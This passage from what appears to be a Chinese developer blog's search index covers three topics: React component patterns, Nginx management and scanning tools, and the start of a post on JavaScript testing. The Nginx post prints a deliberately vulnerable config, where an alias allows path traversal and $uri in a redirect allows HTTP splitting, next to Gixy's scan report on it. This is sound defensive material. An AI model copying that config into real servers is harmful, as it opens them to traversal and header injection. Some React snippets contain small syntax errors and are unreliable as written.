class="name">withLayout</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">withStateTrace</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Component</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">withStateTrace</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">withLayout</span>&gt;</span></span></span><br><span class="line">&lt;/withAuth&gt;</span><br></pre></td></tr></table></figure><h3 id="Render-Props-Pattern"><a href="#Render-Props-Pattern" class="headerlink" title="Render Props Pattern"></a>Render Props Pattern</h3><p>render prop 指的是用函式的 prop 來在 React component 之間共享程式碼的技巧，相對單純簡單只要將共用的程式碼變成 render function 抽出來。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">renderTitle</span> = (<span class="params">data</span>) =&gt; <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;data.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">RenderTitle</span> <span class="attr">render</span>=<span class="string">&#123;renderTitle&#125;</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure><p>不論是 Class-based 與 Functional Component 都能夠使用 HOC Pattern 和 Render Props Pattern，Functional 可用性較 Class-based Component 高。</p><p>可以參考下面這張圖片，Class-based Component 較容易寫出高耦合且較難進行拆分，即使透過 HOC 也會造成多層嵌套。</p><blockquote><p><img src="https://res.cloudinary.com/ddxwdqwkr/image/upload/v1641930050/patterns.dev/classicalvshooks2.001.png"><br>圖片來源: <a href="https://www.patterns.dev/posts/hooks-pattern/">https://www.patterns.dev/posts/hooks-pattern/</a></p></blockquote><h3 id="Hooks-Pattern"><a href="#Hooks-Pattern" class="headerlink" title="Hooks Pattern"></a>Hooks Pattern</h3><p>只有 <code>Functional</code> 的元件能透過 Hook Pattern 來降低元件複雜度。</p><p>Hook 是鉤子的意思，我們可以想像透過鉤子把新功能掛上元件，就像是加上裝備一樣，透過不同的 hook 來增加元件的功能。</p><p>常用 useState 這個 hook 操作狀態，底下範例會操作一個 List 資料。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [list, setList] = <span class="title function_">useState</span>([]);</span><br></pre></td></tr></table></figure><p>接著如果需要透過 API 動態更新這個狀態，這時候會需要動用到 useEffect 這個 Hook</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [list, setList] = <span class="title function_">useState</span>([]);</span><br><span class="line"></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&quot;/members?type=standard&quot;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="title function_">json</span>()).(<span class="function">(<span class="params">res</span>) =&gt;</span> <span class="title function_">setList</span>(res));</span><br><span class="line">&#125;, [])</span><br></pre></td></tr></table></figure><p>接著再把相關的資料透過 JSX 渲染出來，就會完成一個基本的元件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Members</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [list, setList] = <span class="title function_">useState</span>([]);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&quot;/members?type=standard&quot;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="title function_">json</span>()).(<span class="function">(<span class="params">res</span>) =&gt;</span> <span class="title function_">setList</span>(res));</span><br><span class="line">  &#125;, [])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &#123;list.<span class="title function_">map</span>(<span class="function">(<span class="params">elm</span>) =&gt;</span> <span class="language-xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;elm.id&#125;</span>&gt;</span>&#123;elm.name&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span>)&#125;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>透過 hook pattern 在撰寫時相當直觀簡單，不過當需要的資料來源越來越多時，會發現同一個元件裡面的情況會變成下面這樣，會需要很多個 useState 搭配 useEffect。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [list1, setList1] = <span class="title function_">useState</span>([]);</span><br><span class="line"><span class="keyword">const</span> [list2, setList2] = <span class="title function_">useState</span>([]);</span><br><span class="line"><span class="keyword">const</span> [list3, setList3] = <span class="title function_">useState</span>([]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&quot;/members?type=standard&quot;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="title function_">json</span>()).(<span class="function">(<span class="params">res</span>) =&gt;</span> <span class="title function_">setList1</span>(res));</span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&quot;/buy-list?type=standard&quot;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="title function_">json</span>()).(<span class="function">(<span class="params">res</span>) =&gt;</span> <span class="title function_">setList2</span>(res));</span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&quot;/recommend-list?type=standard&quot;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="title function_">json</span>()).(<span class="function">(<span class="params">res</span>) =&gt;</span> <span class="title function_">setList2</span>(res));</span><br><span class="line">&#125;, [])</span><br></pre></td></tr></table></figure><p>這時候比較好的方式是把與資料相關的邏輯改成新的 hook，將資料邏輯和渲染部分拆開就能夠簡化我們的程式碼。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 資料邏輯 useList1.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">useList1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [list, setList] = <span class="title function_">useState</span>([]);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&quot;/members?type=standard&quot;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="title function_">json</span>()).(<span class="function">(<span class="params">res</span>) =&gt;</span> <span class="title function_">setList</span>(res));</span><br><span class="line">  &#125;, [])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">list1</span>: list &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 單純渲染</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Members</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; list1 &#125; = <span class="title function_">useList1</span>();</span><br><span class="line">  <span class="keyword">const</span> &#123; list2 &#125; = <span class="title function_">useList2</span>();</span><br><span class="line">  <span class="keyword">const</span> &#123; list3 &#125; = <span class="title function_">useList3</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &#123;list1.<span class="title function_">map</span>(<span class="function">(<span class="params">elm</span>) =&gt;</span> <span class="language-xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;elm.id&#125;</span>&gt;</span>&#123;elm.name&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span>)&#125;</span><br><span class="line">      &#123;list2.<span class="title function_">map</span>(<span class="function">(<span class="params">elm</span>) =&gt;</span> <span class="language-xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;elm.id&#125;</span>&gt;</span>&#123;elm.name&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span>)&#125;</span><br><span class="line">      &#123;list3.<span class="title function_">map</span>(<span class="function">(<span class="params">elm</span>) =&gt;</span> <span class="language-xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;elm.id&#125;</span>&gt;</span>&#123;elm.name&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span>)&#125;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>當然更進階的做法會是連重構都不需要，以上的過程可以直接使用像是 swr 這套函式庫所提供的 hook 就幫我們做掉以上的流程。</p><p><a href="https://swr.vercel.app/">https://swr.vercel.app/</a></p><p>寫法就會再優化成底下的官方範例:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> useSWR <span class="keyword">from</span> <span class="string">&quot;swr&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Profile</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; data, error, isLoading &#125; = <span class="title function_">useSWR</span>(<span class="string">&quot;/api/user&quot;</span>, fetcher);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (error) <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>failed to load<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (isLoading) <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>loading...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello &#123;data.name&#125;!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最後小編想推薦 useHooks 這個介紹 Hook 的網站，裡面有非常多很棒的範例值得參考與學習。</p><p>傳送門在這裡:</p><blockquote><p><a href="https://usehooks.com/">https://usehooks.com/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> React.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> React.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx 管理與監控工具推薦</title>
      <link href="/2022/12/25/tool-nginx-management/"/>
      <url>/2022/12/25/tool-nginx-management/</url>
      
        <content type="html"><![CDATA[<p>小編在之前的文章介紹過<a href="/2019/07/13/tool-nginx/?utm_source=link&utm_medium=article&utm_campaign=internal_link">常用 Nginx Config 與相關指令來入門網站架設</a>，這篇文章接著會介紹 Nginx 管理與監控工具 Nginx Proxy Manager、Nginx GIXY、GoAccess。</p><h2 id="Nginx-Proxy-Manager"><a href="#Nginx-Proxy-Manager" class="headerlink" title="Nginx Proxy Manager"></a>Nginx Proxy Manager</h2><p>Nginx Proxy Manager 提供圖形化的管理介面，並且內建支援 Let’s Encrypt 能免費支援網頁 HTTPS 服務。</p><p>透過 GUI 的管理介面可以更清楚的瀏覽 Proxy 設定，並且透過 Log 也可以看到修改紀錄，蠻適合用在測試環境給新手共同維護。</p><p>照著官網的安裝也真的很快速，官方網站：<a href="https://nginxproxymanager.com/">https://nginxproxymanager.com/</a></p><ol><li>加入 <code>docker-compose.yml</code></li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">app:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;jc21/nginx-proxy-manager:latest&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="comment"># These ports are in format &lt;host-port&gt;:&lt;container-port&gt;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:80&quot;</span> <span class="comment"># Public HTTP Port</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;443:443&quot;</span> <span class="comment"># Public HTTPS Port</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;81:81&quot;</span> <span class="comment"># Admin Web Port</span></span><br><span class="line">      <span class="comment"># Add any other Stream port you want to expose</span></span><br><span class="line">      <span class="comment"># - &#x27;21:21&#x27; # FTP</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Uncomment the next line if you uncomment anything in the section</span></span><br><span class="line">    <span class="comment"># environment:</span></span><br><span class="line">    <span class="comment"># Uncomment this if you want to change the location of</span></span><br><span class="line">    <span class="comment"># the SQLite DB file within the container</span></span><br><span class="line">    <span class="comment"># DB_SQLITE_FILE: &quot;/data/database.sqlite&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Uncomment this if IPv6 is not enabled on your host</span></span><br><span class="line">    <span class="comment"># DISABLE_IPV6: &#x27;true&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./data:/data</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./letsencrypt:/etc/letsencrypt</span></span><br></pre></td></tr></table></figure><ol start="2"><li><code>docker-compose up -d</code></li><li><code>http://127.0.0.1:81</code> 預設的帳號密碼 <a href="mailto:&#x61;&#100;&#109;&#105;&#110;&#64;&#101;&#x78;&#x61;&#109;&#112;&#108;&#x65;&#x2e;&#x63;&#111;&#109;">&#x61;&#100;&#109;&#105;&#110;&#64;&#101;&#x78;&#x61;&#109;&#112;&#108;&#x65;&#x2e;&#x63;&#111;&#109;</a>&#x2F;changeme</li></ol><p>測試的話，windows 的開發環境可以修改 host 檔案，位置會在 <code>C:\WINDOWS\system32\drivers\etc\hosts</code>，來讓 domain 可以在開發機上生效，底下是我的 config</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 proxy.test.com</span><br></pre></td></tr></table></figure><p>接著在 Nginx Proxy Manager 上進行設定，就可以看到已經 proxy 成功了。</p><blockquote><p>Nginx Proxy Manager 設定<br><img src="https://linyencheng.github.io/2022/12/25/tool-nginx-management/NginxProxyManager.png" alt="Nginx Proxy Manager"></p></blockquote><h2 id="Nginx-GIXY"><a href="#Nginx-GIXY" class="headerlink" title="Nginx GIXY"></a>Nginx GIXY</h2><p><a href="https://github.com/yandex/gixy/">Gixy</a> 是一個分析 Nginx 配置的自動化缺陷檢測工具，主要目標是避免錯誤和配置導致資安漏洞。</p><p>有一個練習用的 Repo <a href="https://github.com/detectify/vulnerable-nginx">vulnerable-nginx</a> 可以拿來測試常見的問題。</p><ul><li>url normalization 改變 URL<ul><li>&#x2F; 有差，盡量補上 slash 避免發生意外</li><li><a href="https://nginx.org/en/docs/http/ngx_http_core_module.html#location">https://nginx.org/en/docs/http/ngx_http_core_module.html#location</a></li></ul></li><li>反向代理到後端的 URL 有沒有路徑解析不一致</li></ul><blockquote><p>$uri: current URI in request, normalized<br>The value of $uri may change during request processing, e.g. when doing internal redirects, or when using index files.</p></blockquote><p>使用 GIXY 分析結果如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location /cats &#123;</span><br><span class="line">    alias C:\nginx-1.18.0\html\;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location /image-credits &#123;</span><br><span class="line">    return 302 https://placekitten.com/attribution.html?originalPath=$uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">(base) PS C:\Users\yencheng&gt; gixy C:\nginx-1.18.0\conf\nginx.conf</span><br><span class="line"></span><br><span class="line">[95m==================== Results ===================[0m</span><br><span class="line"></span><br><span class="line">[91m&gt;&gt; Problem: [http_splitting] Possible HTTP-Splitting vulnerability.[0m</span><br><span class="line">Description: Using variables that can contain &quot;\n&quot; or &quot;\r&quot; may lead to http injection.</span><br><span class="line">Additional info: https://github.com/yandex/gixy/blob/master/docs/en/plugins/httpsplitting.md</span><br><span class="line">Reason: At least variable &quot;$uri&quot; can contain &quot;\n&quot;</span><br><span class="line">Pseudo config:</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        server_name localhost;</span><br><span class="line"></span><br><span class="line">        location /image-credits &#123;</span><br><span class="line">                return 302 https://placekitten.com/attribution.html?originalPath=$uri;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">------------------------------------------------</span><br><span class="line"></span><br><span class="line">[93m&gt;&gt; Problem: [alias_traversal] Path traversal via misconfigured alias.[0m</span><br><span class="line">Description: Using alias in a prefixed location that doesn&#x27;t ends with directory separator could lead to path traversal vulnerability.</span><br><span class="line">Additional info: https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md</span><br><span class="line">Pseudo config:</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        server_name localhost;</span><br><span class="line"></span><br><span class="line">        location /cats &#123;</span><br><span class="line">                alias C:\nginx-1.18.0\html\;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[95m==================== Summary ===================[0m</span><br><span class="line">Total issues:</span><br><span class="line">    Unspecified: 0</span><br><span class="line">    Low: 0</span><br><span class="line">    Medium: 1</span><br><span class="line">    High: 1</span><br></pre></td></tr></table></figure><h2 id="Nginx-監控報表"><a href="#Nginx-監控報表" class="headerlink" title="Nginx 監控報表"></a>Nginx 監控報表</h2><p>目前我有使用過最簡單的方式有兩個:</p><ol><li>透過 Elastic 提供的 Filebeat 和 Metricbeat 可以從狀態、日誌<strong>即時</strong>的去監控 Nginx</li><li>使用開源的 GoAccess 加上系統排程<strong>定時</strong>更新資料</li></ol><h3 id="Elastic-Metricbeat"><a href="#Elastic-Metricbeat" class="headerlink" title="Elastic Metricbeat"></a>Elastic Metricbeat</h3><p>之前剛好使用過 Elastic 相關 Solution，發現透過簡單的配置就能夠知道目前伺服器的狀況，詳細的教學歡迎參考這篇文章: <a href="/2020/09/03/elastic-metrics-quick-start?utm_source=link&utm_medium=article&utm_campaign=internal_link">Elastic Metricbeat 搭配 Kibana 來監控 Nginx 伺服器狀態</a>，就像下圖就是系統預設提供的樣板，可以簡單即時去監控 Nginx 的流量、記憶體、處理器當下使用量。</p><blockquote><p>Metricbeat + Kibana<br><img src="https://linyencheng.github.io/2020/09/03/elastic-metrics-quick-start/SystemMetric.JPG" alt="SystemMetric"></p></blockquote><h3 id="Elastic-Filebeat"><a href="#Elastic-Filebeat" class="headerlink" title="Elastic Filebeat"></a>Elastic Filebeat</h3><p>那如果需要分析 Log 並產生報表呢? 當然也可以透過 Elastic 相關 Solution，透過 <a href="/2020/09/02/elastic-logging-quick-start?utm_source=link&utm_medium=article&utm_campaign=internal_link">Filebeat 傳送 Nginx Access Log 到 Elasticsearch 中</a>，最後透過 Kibana 即時監看相關分析。</p><blockquote><p>Filebeat + Kibana<br><img src="https://linyencheng.github.io/2020/09/02/elastic-logging-quick-start/DashBoardDemo.JPG" alt="FilebeatDashBoard"></p></blockquote><h3 id="GoAccess"><a href="#GoAccess" class="headerlink" title="GoAccess"></a>GoAccess</h3><p><a href="https://goaccess.io/">GoAccess</a> 是一套開源的工具能夠分析 Log 並且產生報表的靜態網頁，不過由於是靜態網頁，所以使用上就需要透過設定作業系統排程來定時跑腳本更新頁面。</p><ol><li>透過指令安裝</li></ol><ul><li><code>sudo apt-get update</code></li><li><code>sudo apt-get install goaccess</code></li></ul><ol start="2"><li>透過指令直接產生</li></ol><ul><li><code>goaccess -f /var/log/nginx/access.log</code></li></ul><blockquote><p>GoAccess Dashboard<br><img src="https://linyencheng.github.io/2020/09/02/elastic-logging-quick-start/GoAccessDashboard.JPG" alt="GoAccessDashboard"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 雲端服務 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 雲端服務 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用 JavaScript 測試你的網站</title>
      <link href="/2022/10/13/relationships-between-frontend-and-backend/js-web-testing/"/>
      <url>/2022/10/13/relationships-between-frontend-and-backend/js-web-testing/</url>
      
        <content type="html"><![CDATA[<p>測試這件事情是為了一致性，為了不讓伴侶不信任，在男女之間交往一致性也是很重要的一環。</p><p>在日常的對話和相處過程中，彼此都會透過些方法來確認， <a href="https://womany.net/read/article/18074">John Rempel</a> 等人提出信任包含可預測、可依賴和信念三個要素。</p><ul><li>可預測判斷的依據就是過去伴侶行為的一致性</li><li>可依賴代表相信且願意依賴伴侶協助解決問題</li></ul><p>以程式測試來說，每次的測試會期待能得到相同結果，並且認為能夠依賴系統解決問題。</p><p>舉個例子來說小編前公司是做看盤軟體，為了確保 Production 環境穩定，每天會在開盤前執行 E2E 測試確保網站運作正常，即便當錯誤發生也能即時寄信通知相關人員。</p><h2 id="JavaScript-測試"><a href="#JavaScript-測試" class="headerlink" title="JavaScript 測試"></a>JavaScript 測試</h2><p>寫測試前要問三個問題</p><ol><li>在什麼情境?</li><li>要測試什麼?</li><li>預期的結果?</li></ol><p>測試的步驟上大致會遵守 3A 原則</p><ol><li>Arrange: 準備物件、建立物件、物件設定 (fixture) -&gt; 情境</li><li>Act: 操作物件 -&gt; 測試內容</li><li>Assert: 驗證結果符合預期 -&gt; 預期結果</li></ol><p>好的單元測試</p><ul><li>執行夠快</li><li>會得到相同結果</li><li>跟其他測試完全獨立</li><li>理論上不需要 DB、網路，用 Mock Server 或是 Mock Object 模擬外部傳回資料</li></ul><p>測試是為了開發速度和產品品質，不要因為著急而跳過測試，沒有測試的話會花更多時間在上線前的來回，可能有些問題還沒修好就上線，引發更多新問題，但什麼都要測試嗎?</p><ul><li>追求 “測到關鍵邏輯”，關鍵的測試有測到更重要</li><li>測試是為了速度與品質</li><li>不好的 “快” 不是 “真的快”</li><li>寫測試的時候應避免重複寫原來的程式邏輯</li></ul><p>建議做黑箱測試也就是測試流程與結果即可，在測試公開的介面或元件的過程中其實也會順便測試到內部邏輯，當撰寫 E2E 測試的時候也有單元測試覆蓋的概念，雖然 E2E 的運行成本較高，但針對可能會頻繁更改的內部實作做單元測試也有點浪費時間。</p><p>另外 E2E 測試也可以當作一個文件，可以告訴不熟系統的人關鍵操作流程以及定義什麼是正常的操作，按照使用者故事跑過網站的關鍵流程，並且交由助理工程師來協助驗收。</p><p>推薦工具:</p><ul><li>BDD (行為驅動測試) 框架是 Cucumber 可以參考看看</li><li>StoryBook 提供一個元件操作介面來做元件測試</li></ul><blockquote><p>Comparing JavaScript Testing Frameworks<br><img src="https://blog.logrocket.com/wp-content/uploads/2021/02/Popularity-graph-of-Node-js-unit-testing-frameworks.png"></p></blockquote><h2 id="單元測試"><a href="#單元測試" class="headerlink" title="單元測試"></a>單元測試</h2><p>當前端開發元件化以後，最基本的就是針對元件做單元測試，第一次寫測試的話可以先問自己幾個問題:</p><ul><li>單元測試該怎麼撰寫?</li><li>Jest 的腳色是什麼?</li><li>什麼是 enzyme?</li><li>什麼是 shallow &amp; mount ?</li></ul><p>單元測試通常是一個<strong>自動化</strong>的測試，確保某一段程式碼 (單元) 有被正式執行，在測試時大多使用單元測試框架測試。</p><ul><li>會呼叫<strong>被測試單元</strong>的入口點</li><li>檢查其中一個出口點，所以唯一出口較好測試</li></ul><p>單元測試在測什麼</p><ul><li>元件測試，import 後用 mount 然後 props 用假資料進行測試，模擬點擊 <code>jest.fn()</code></li><li>function 測試，import 後用假資料測試</li><li>非同步: <code>jest.fn()</code></li><li>test fixture: 測試的時候特意準備的東西，讓測試可以順利跑完所需要，有些人會叫做 test context</li><li>包含測試</li><li>出口測試<ul><li>CUT: Code under test</li><li>SUT: system under test</li></ul></li></ul><p>依照使用的框架或函式庫不同會有不同的測試工具，像 react 的話 facebook 官方就有 <a href="http://facebook.github.io/jest/">Jest</a>。</p><p>Jest 對於單元測試來說非常方便而且也包含了覆蓋率的計算，最後會直接出一個報表給你，文章中也有推薦 enzyme，是 airbnb 開發的工具，據 react 官方說法是讓測試更簡單。</p><p>enzyme 只是讓我們更方便測試 react 用的外掛，主要是因為 react 有用到 virtual dom ，那測試又會需要去 render，所以 enzyme 就封裝了 <a href="https://facebook.github.io/react/docs/test-utils.html">react 原生的測試</a>讓寫法更直覺。</p><ul><li>shallow: 只 render 第一層</li><li>mount: full render，包含元件週期</li><li>render</li><li>simulate: 模擬 event</li><li>setProps: 設定 props</li><li>setState: 設定 state</li><li>prop(key): retrieves prop value corresponding to the provided key</li><li>state(key): retrieves state corresponding to the provided key</li></ul><h3 id="單元測試該怎麼撰寫"><a href="#單元測試該怎麼撰寫" class="headerlink" title="單元測試該怎麼撰寫"></a>單元測試該怎麼撰寫</h3><p>寫法上會用到以下三個基本關鍵字 describe , it , expect，這是撰寫單元測試的語法架構，寫完這三項就是基本的測試了。</p><ul><li>describe: 主要是拿來整理 it 用(在這邊又可以用 test 代替），相關的 it 就可以包在 describe 裡面作更進一步的分類整理。</li><li>it: 是最小的測試單位，所以每一項測試都要寫在某個 it function 裡。it 第一個參數是測試名稱，其實就是給你註解到底這個測試要幹嘛，然後搭配 before、beforeEach、after、afterEach 做進階操作</li><li>expect: 按照名字來看就是你預期他到底怎樣，搭配 it 這個測試項目，看跑出來的結果是不是跟 expect 中的一樣，這就是基本的測試了</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span 